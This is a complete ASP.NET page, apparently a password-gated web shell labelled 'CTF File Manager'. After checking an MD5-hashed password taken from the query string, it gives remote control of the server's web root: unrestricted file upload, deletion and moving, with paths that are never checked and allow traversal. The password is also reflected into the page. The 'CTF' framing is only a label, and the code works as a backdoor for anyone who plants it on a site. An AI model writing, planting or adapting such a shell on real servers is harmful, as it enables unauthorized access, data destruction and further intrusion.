<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    // ← CHANGE THIS MD5 HASH
    string correctMD5 = "e662ddd93d6f72abfb31328821b595cc";  

    protected void Page_Load(object sender, EventArgs e)
    {
        string inputPass = Request.QueryString["p"];

        if (string.IsNullOrEmpty(inputPass) || !VerifyMD5(inputPass, correctMD5))
        {
            Response.Write("<h2>Access Denied</h2><p>Use: <code>?p=yourpassword</code></p>");
            Response.End();
        }

        // Handle messages
        if (Request.QueryString["msg"] == "ok")
            lblMsg.Text = "<span style='color:lime'>✅ Operation Successful!</span>";

        // Handle Delete
        string del = Request.QueryString["del"];
        if (!string.IsNullOrEmpty(del))
        {
            DeleteFile(Server.UrlDecode(del));
        }

        // Handle Move
        string action = Request.QueryString["action"];
        string target = Request.QueryString["target"];
        string dest = Request.QueryString["dest"];

        if (action == "move" && !string.IsNullOrEmpty(target) && !string.IsNullOrEmpty(dest))
        {
            MoveFile(Server.UrlDecode(target), Server.UrlDecode(dest));
        }
    }

    bool VerifyMD5(string input, string correctHash)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] inputBytes = Encoding.UTF8.GetBytes(input);
            byte[] hashBytes = md5.ComputeHash(inputBytes);
            
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hashBytes.Length; i++)
                sb.Append(hashBytes[i].ToString("x2"));
            
            return sb.ToString().Equals(correctHash, StringComparison.OrdinalIgnoreCase);
        }
    }

    void DeleteFile(string fileName)
    {
        try
        {
            string path = Server.MapPath("~/") + fileName;
            if (File.Exists(path)) File.Delete(path);
        }
        catch { }
    }

    void MoveFile(string sourceFile, string destFolder)
    {
        try
        {
            string sourcePath = Server.MapPath("~/") + sourceFile;
            string destPath = Server.MapPath("~/") + destFolder.TrimEnd('/') + "/" + Path.GetFileName(sourceFile);

            if (File.Exists(sourcePath) && !File.Exists(destPath))
                File.Move(sourcePath, destPath);
        }
        catch { }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
        {
            try
            {
                string fileName = Path.GetFileName(FileUpload1.FileName);
                string savePath = Server.MapPath("~/") + fileName;
                FileUpload1.SaveAs(savePath);
                Response.Redirect("?p=" + Request.QueryString["p"] + "&msg=ok");
            }
            catch { }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>CTF File Manager - MD5 Protected</title>
    <style>
        body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
        table { border-collapse: collapse; width: 100%; margin-top: 10px; }
        th, td { border: 1px solid #00aa00; padding: 10px; }
        th { background: #111; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { color: #fff; }
        .dir { color: #ffff00; font-weight: bold; }
        .actions a { margin-right: 12px; }
        .upload-box, .move-box { border: 2px dashed #00ff00; padding: 15px; background: #111; margin: 15px 0; }
    </style>
</head>
<body>
    <h1>🛠️ CTF File Manager (MD5 Password)</h1>
    <p>Use: <code>fm.aspx?p=yourpassword</code></p>
    <hr>

    <div class="upload-box">
        <h2>Upload File</h2>
        <form runat="server" enctype="multipart/form-data">
            <asp:FileUpload ID="FileUpload1" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
            <asp:Label ID="lblMsg" runat="server" />
        </form>
    </div>

    <h2>📁 Current Directory</h2>

    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Actions</th>
        </tr>
        <%
            string currentDir = Server.MapPath("~/");
            
            // Folders
            foreach (var dir in Directory.GetDirectories(currentDir).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
            {
        %>
        <tr>
            <td class="dir">📁 <%= dir.Name %></td>
            <td>Folder</td>
            <td>-</td>
            <td><%= dir.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td></td>
        </tr>
        <% } %>

        <!-- Files -->
        <%
            var files = Directory.GetFiles(currentDir).Select(f => new FileInfo(f)).OrderBy(f => f.Name);

            foreach (var file in files)
            {
                string fileName = file.Name;
                string encoded = Server.UrlEncode(fileName);
        %>
        <tr>
            <td><%= fileName %></td>
            <td>File</td>
            <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
            <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td class="actions">
                <a href="<%= fileName %>" download>⬇️ Download</a>
                <a href="?p=<%= Request.QueryString["p"] %>&del=<%= encoded %>" onclick="return confirm('Delete?')">🗑️ Delete</a>
                <a href="javascript:void(0)" onclick="moveFile('<%= encoded %>')">🔀 Move</a>
            </td>
        </tr>
        <% } %>
    </table>

    <!-- Move Form -->
    <div class="move-box" id="moveForm" style="display:none;">
        <h2>Move File</h2>
        <form method="get">
            <input type="hidden" name="p" value="<%= Request.QueryString["p"] %>" />
            <input type="hidden" name="action" value="move" />
            <input type="hidden" id="source" name="target" />
            Move to: <input type="text" name="dest" placeholder="foldername" style="width:280px;padding:6px;"/>
            <input type="submit" value="Move" />
            <button type="button" onclick="document.getElementById('moveForm').style.display='none'">Cancel</button>
        </form>
    </div>

    <script>
        function moveFile(filename) {
            document.getElementById('source').value = filename;
            document.getElementById('moveForm').style.display = 'block';
        }
    </script>
</body>
</html>
